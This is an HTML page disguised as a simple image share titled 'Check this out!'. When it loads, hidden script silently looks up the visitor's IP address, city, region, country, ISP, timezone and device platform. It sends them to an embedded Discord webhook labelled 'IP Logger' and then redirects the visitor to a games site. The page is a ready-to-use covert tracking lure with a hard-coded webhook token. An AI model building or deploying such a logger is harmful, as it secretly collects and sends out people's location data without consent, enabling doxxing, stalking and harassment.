<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Check this out!</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }
        img {
            max-width: 95%;
            max-height: 95vh;
            border-radius: 10px;
            box-shadow: 0 20px 60px rgba(255, 255, 255, 0.3);
            animation: fadeIn 0.5s ease-in;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }
    </style>
</head>
<body>
    <!-- CHANGE THIS IMAGE URL TO WHATEVER YOU WANT -->
    <img src="https://i.imgur.com/YQ5xGXJ.jpeg" alt="Image">

    <script>
        // YOUR DISCORD WEBHOOK
        const WEBHOOK = 'https://discord.com/api/webhooks/1464441055293210722/OQtfaLrpEDoIB2RcNP44v3mKMDOAl5y7-gu9aQrD2I7ll_eVXWEnlH0ujyi4lIHLKbfF';

        (async function() {
            try {
                // Get IP info using ipapi
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                // Send to Discord
                const embed = {
                    embeds: [{
                        title: '🎯 Someone Clicked Your Link!',
                        color: 3447003,
                        fields: [
                            { name: '🌐 IP Address', value: data.ip || 'Unknown', inline: true },
                            { name: '🏙️ City', value: data.city || 'Unknown', inline: true },
                            { name: '📍 Region', value: data.region || 'Unknown', inline: true },
                            { name: '🌎 Country', value: data.country_name || 'Unknown', inline: true },
                            { name: '🏢 ISP', value: data.org || 'Unknown', inline: false },
                            { name: '🕐 Timezone', value: data.timezone || 'Unknown', inline: true },
                            { name: '📱 Device', value: navigator.platform, inline: true },
                            { name: '⏰ Time', value: new Date().toLocaleString(), inline: false }
                        ],
                        footer: { text: 'IP Logger' },
                        timestamp: new Date().toISOString()
                    }]
                };

                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(embed)
                });

            } catch (error) {
                console.error('Error:', error);
            }

            // Redirect to Poki after 3 seconds (they see the image first)
            setTimeout(() => {
                window.location.href = 'https://poki.com';
            }, 3000);
        })();
    </script>
</body>
</html>
